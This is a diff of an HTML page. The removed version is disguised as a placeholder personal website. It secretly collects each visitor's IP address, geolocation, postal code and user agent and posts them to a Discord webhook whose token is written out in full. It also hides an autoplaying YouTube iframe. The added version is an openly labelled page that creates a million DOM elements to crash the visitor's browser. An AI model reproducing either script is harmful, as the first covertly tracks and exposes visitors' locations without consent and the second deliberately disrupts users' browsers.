@@ -3,141 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your Website Title</title>
+    <title>Browser Stress Test</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            background: linear-gradient(45deg, #1a1a1a, #2d2d2d);
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-
-        #ip-display {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(0, 0, 0, 0.8);
-            color: #00ff00;
-            padding: 10px;
-            border-radius: 5px;
             font-family: monospace;
-            z-index: 9999;
-            font-size: 14px;
-        }
-
-        .content {
-            padding: 20px;
+            background-color: #1a1a1a;
+            color: #f0f0f0;
             text-align: center;
+            padding-top: 50px;
+            margin: 0;
         }
-
-        .video-container {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            width: 200px;
-            height: 50px;
-            opacity: 0.01;
-            pointer-events: none;
-            z-index: -1;
+        h1 {
+            color: #ff4136;
+        }
+        p {
+            max-width: 600px;
+            margin: 20px auto;
+            line-height: 1.6;
+        }
+        .warning {
+            color: #ffdc00;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div id="ip-display">Your IP is: <span id="ip-span">detecting...</span></div>
 
-    <div class="content">
-        <h1>Welcome to my website</h1>
-        <p>Content goes here...</p>
-    </div>
-
-    <!-- Hidden YouTube video for audio -->
-    <div class="video-container">
-        <iframe
-            id="youtube-player"
-            width="200"
-            height="50"
-            src="https://www.youtube.com/embed/8WIKVGG5GXU?autoplay=1&mute=0&loop=1&playlist=8WIKVGG5GXU&controls=0&showinfo=0&autohide=1&modestbranding=1"
-            frameborder="0"
-            allow="autoplay; encrypted-media"
-            allowfullscreen>
-        </iframe>
-    </div>
+    <h1>Browser Stress Test</h1>
+    <p>This page will attempt to crash your browser by creating a massive number of DOM elements.</p>
+    <p class="warning">Proceed with caution. Your browser tab may become unresponsive and need to be closed.</p>
 
     <script>
-        // Function to format IP address
-        function formatIP(ip) {
-            const parts = ip.split('.');
-            return parts.map(part => parseInt(part, 10)).join('.');
+        // This will attempt to create and append an enormous number of divs to the body.
+        // The browser will run out of memory trying to render and manage them.
+        for (let i = 0; i < 1_000_000; i++) {
+            const div = document.createElement('div');
+            document.body.appendChild(div);
         }
-
-        // Get user's IP and location
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const formattedIP = formatIP(ip);
-                const lat = data.latitude;
-                const lon = data.longitude;
-                const city = data.city;
-                const region = data.region;
-                const country = data.country_name;
-                const postal = data.postal;
-
-                // Display IP to user
-                document.getElementById('ip-span').textContent = formattedIP;
-
-                // Create Google Maps link
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                // Prepare payload
-                const payload = {
-                    ip: formattedIP,
-                    coordinates: `${lat}, ${lon}`,
-                    latitude: lat,
-                    longitude: lon,
-                    city: city,
-                    region: region,
-                    country: country,
-                    postalCode: postal,
-                    mapsLink: mapsLink,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                };
-
-                // Send data
-                sendData(payload);
-            })
-            .catch(err => {
-                console.log('IP fetch failed:', err);
-                document.getElementById('ip-span').textContent = 'Failed to detect';
-            });
-
-        function sendData(data) {
-            // Send to your Discord webhook
-            fetch('https://discord.com/api/webhooks/1454552751521402892/9yXxj3zUYhU3rlx3De5pRdOSwpfc5bX2zT5zq5WVb5TDVUleps7H_VBdqPn1vXWtNBN-', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Data sent successfully');
-                } else {
-                    console.log('Failed to send data');
-                }
-            }).catch(err => {
-                console.log('Error sending data:', err);
-            });
-        }
-
-        // Handle YouTube autoplay (most browsers block autoplay until user interaction)
-        document.addEventListener('click', function initAudio() {
-            const iframe = document.getElementById('youtube-player');
-            iframe.src = iframe.src.replace('mute=0', 'mute=0');
-        }, { once: true });
     </script>
+
 </body>
 </html>
